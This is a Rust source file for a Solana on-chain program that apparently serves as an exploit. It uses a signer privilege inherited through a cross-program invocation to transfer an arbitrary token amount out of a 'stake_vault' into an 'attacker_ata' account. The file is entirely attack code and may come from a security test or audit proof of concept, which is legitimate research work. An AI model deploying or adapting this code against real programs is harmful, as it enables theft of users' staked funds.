#![no_std]
#![deny(unsafe_code)]

extern crate alloc;

#[allow(unused_imports)]
use alloc::format;
use solana_program::{
    account_info::{next_account_info, AccountInfo},
    entrypoint,
    entrypoint::ProgramResult,
    program::invoke,
    program_error::ProgramError,
    pubkey::Pubkey,
};

entrypoint!(process_instruction);

pub fn process_instruction<'a>(
    _program_id: &Pubkey,
    accounts: &'a [AccountInfo<'a>],
    data: &[u8],
) -> ProgramResult {
    if data.len() < 9 {
        return Err(ProgramError::InvalidInstructionData);
    }

    let amount = u64::from_le_bytes(data[1..9].try_into().unwrap());
    let iter = &mut accounts.iter();
    let inherited_signer = next_account_info(iter)?;
    let _slab = next_account_info(iter)?;
    let stake_vault = next_account_info(iter)?;
    let attacker_ata = next_account_info(iter)?;
    let token_program = next_account_info(iter)?;

    if !inherited_signer.is_signer {
        return Err(ProgramError::MissingRequiredSignature);
    }
    if *token_program.key != spl_token::ID {
        return Err(ProgramError::IncorrectProgramId);
    }

    let ix = spl_token::instruction::transfer(
        token_program.key,
        stake_vault.key,
        attacker_ata.key,
        inherited_signer.key,
        &[],
        amount,
    )?;
    invoke(
        &ix,
        &[
            stake_vault.clone(),
            attacker_ata.clone(),
            inherited_signer.clone(),
            token_program.clone(),
        ],
    )
}
